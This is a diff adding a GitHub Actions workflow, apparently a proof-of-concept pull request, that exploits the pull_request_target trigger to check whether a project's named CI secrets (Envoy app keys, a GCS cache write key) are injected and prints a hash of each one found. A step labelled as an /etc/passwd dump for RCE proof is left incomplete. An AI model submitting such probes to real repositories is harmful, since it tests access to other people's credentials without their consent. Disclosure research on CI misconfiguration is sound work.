@@ -1,0 +1,29 @@
+name: PoC – pull_request_target secret exposure
+
+on:
+  pull_request_target:
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Dump passwd (RCE proof)
+        run: |
+          echo "Showing first 5 lines of /etc/passwd"
+         
+      - name: Show event + repo context
+        run: |
+          echo "Triggered by: ${{ github.event_name }}"
+          echo "Running in repo: ${{ github.repository }}"
+          echo "Actor: ${{ github.actor }}"
+
+      - name: Check if secrets are injected
+        run: |
+          echo "Listing potential ENVOY secrets (hashed):"
+          for s in ENVOY_CI_APP_KEY ENVOY_CI_APP_ID ENVOY_CI_MUTEX_APP_KEY ENVOY_CI_MUTEX_APP_ID GCS_CACHE_WRITE_KEY; do
+            if [ -n "${!s}" ]; then
+              echo "$s=present, hash=$(echo -n ${!s} | sha256sum | cut -d' ' -f1)"
+            else
+              echo "$s=not found"
+            fi
+          done
